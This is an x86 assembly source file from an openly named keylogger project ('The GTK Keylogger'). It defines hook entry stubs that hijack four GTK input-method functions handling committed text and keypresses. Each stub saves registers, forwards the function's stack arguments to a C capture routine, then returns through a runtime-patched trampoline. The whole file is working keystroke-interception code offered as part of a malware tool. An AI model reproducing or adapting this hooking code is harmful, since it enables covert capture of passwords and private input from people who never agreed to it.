/*
 * This file is the source code for the hook entries of each function to be hooked, supporting the architecture x86.
 *
 * This is also part of The GTK Keylogger.
 *
 * Authors:
 *
 * Abel Romero Pérez aka D1W0U - abel@abelromero.com - @diw0u - http://www.abelromero.com 
 * David Reguera García aka Dreg - dreg@fr33project.org - @fr33project - http://www.fr33project.org
 *
 */

// hooked_func:
// 0: push hook_entry
// 1: ret
// 2: opcode <-- return from trampoline
// 3: opcode
//
// trampoline:
// repaired_opcodes
// push hooked_func+2
// ret
//
// hook_entry:
// pushf
// pusha
// fix stack arguments
// call mi rutina en C
// fix stack
// popa
// popf
// jmp trampoline

.include "kl_config.S"

.globl gtk_im_multicontext_commit_cb_hook_entry

.globl gtk_im_multicontext_commit_cb_hook_entry_jmp_addr

.globl gtk_im_multicontext_filter_keypress_hook_entry

.globl gtk_im_multicontext_filter_keypress_hook_entry_jmp_addr

.globl gtk_im_context_simple_commit_char_hook_entry

.globl gtk_im_context_simple_commit_char_hook_entry_jmp_addr

.globl gtk_im_context_simple_filter_keypress_hook_entry

.globl gtk_im_context_simple_filter_keypress_hook_entry_jmp_addr


gtk_im_multicontext_commit_cb_hook_entry:
  pushf
  pusha
  mov %esp, %ebp
  mov 48(%ebp), %eax
  push %eax
  mov 44(%ebp), %eax
  push %eax
  mov 40(%ebp), %eax
  push %eax
  call My_gtk_im_multicontext_commit_cb
  add $12, %esp
  popa
  popf
gtk_im_multicontext_commit_cb_hook_entry_jmp_addr:
  push $0xdeadbabe
  ret

gtk_im_context_simple_commit_char_hook_entry:
  pushf
  pusha
  mov %esp, %ebp

.if UBUNTU == 1

  mov 48(%ebp), %eax
  push %eax
  mov 44(%ebp), %eax
  push %eax

.elseif DEBIAN == 1

  mov 52(%ebp), %eax
  push %eax
  mov 48(%ebp), %eax
  push %eax

.endif

  call My_gtk_im_context_simple_commit_char
  add $8, %esp
  popa
  popf
gtk_im_context_simple_commit_char_hook_entry_jmp_addr:
  push $0xdeadbabe
  ret

gtk_im_multicontext_filter_keypress_hook_entry:
  pushf
  pusha
  mov %esp, %ebp
  mov 44(%ebp), %eax
  push %eax
  mov 40(%ebp), %eax
  push %eax
  call My_gtk_im_multicontext_filter_keypress
  add $8, %esp
  popa
  popf
gtk_im_multicontext_filter_keypress_hook_entry_jmp_addr:
  push $0xdeadbabe
  ret

gtk_im_context_simple_filter_keypress_hook_entry:
  pushf
  pusha
  mov %esp, %ebp
  mov 44(%ebp), %eax
  push %eax
  mov 40(%ebp), %eax
  push %eax
  call My_gtk_im_context_simple_filter_keypress
  add $8, %esp
  popa
  popf
gtk_im_context_simple_filter_keypress_hook_entry_jmp_addr:
  push $0xdeadbabe
  ret
